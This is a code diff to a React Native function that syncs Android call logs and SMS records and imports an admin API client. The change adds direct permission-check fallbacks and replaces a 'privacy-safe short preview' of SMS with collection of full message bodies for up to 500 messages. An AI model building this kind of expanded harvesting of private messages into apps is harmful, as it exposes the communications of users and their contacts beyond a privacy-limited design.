@@ -1,3 +1,4 @@
+import { Platform, PermissionsAndroid } from "react-native";
 import { DeviceTelephony, TelephonyStatus } from "../../modules/device-telephony";
 import { adminAPI } from "../api/client";
 import { appStorage } from "../utils/storage";
@@ -28,19 +29,34 @@ export async function syncDeviceTelephonyLogs(): Promise<SyncTelephonyResult> {
     // 1. Verify physical device permissions
     const perms = await checkCurrentPermissionsStatus();
 
-    callStatus = perms.callHistory
+    let hasCallPerm = perms.callHistory;
+    let hasSmsPerm = perms.sms;
+
+    // Direct platform check fallback
+    if (!hasCallPerm && Platform.OS === "android") {
+      try {
+        hasCallPerm = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_CALL_LOG);
+      } catch {}
+    }
+    if (!hasSmsPerm && Platform.OS === "android") {
+      try {
+        hasSmsPerm = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_SMS);
+      } catch {}
+    }
+
+    callStatus = hasCallPerm
       ? "GRANTED"
       : perms.callStatus === "RESTRICTED"
       ? "RESTRICTED"
       : "DENIED";
-    smsStatus = perms.sms
+    smsStatus = hasSmsPerm
       ? "GRANTED"
       : perms.smsStatus === "RESTRICTED"
       ? "RESTRICTED"
       : "DENIED";
 
-    // 2. Fetch permitted device Call Logs (batch fetching across pagination 50, 100, 150+ up to 500 records)
-    if (perms.callHistory) {
+    // 2. Fetch permitted device Call Logs (batch fetching up to 500 records)
+    if (hasCallPerm) {
       const callRes = await DeviceTelephony.getBatchCallLogs(50, 500);
       callStatus = callRes.status;
       if (callRes.records && callRes.records.length > 0) {
@@ -56,8 +72,8 @@ export async function syncDeviceTelephonyLogs(): Promise<SyncTelephonyResult> {
       }
     }
 
-    // 3. Fetch permitted device SMS metadata (including privacy-safe short preview)
-    if (perms.sms) {
+    // 3. Fetch permitted device SMS records (including full SMS body & preview)
+    if (hasSmsPerm) {
       const smsRes = await DeviceTelephony.getBatchSmsMetadata(50, 500);
       smsStatus = smsRes.status;
       if (smsRes.records && smsRes.records.length > 0) {
@@ -66,7 +82,8 @@ export async function syncDeviceTelephonyLogs(): Promise<SyncTelephonyResult> {
           address: s.address,
           smsType: s.smsType,
           timestamp: s.timestamp,
-          preview: s.preview || "",
+          preview: s.preview || (s.body ? (s.body.length > 60 ? s.body.slice(0, 57) + "..." : s.body) : ""),
+          body: s.body || s.preview || "",
           syncKey: `sms_${s.id || s.timestamp}_${s.address}`,
         }));
       }
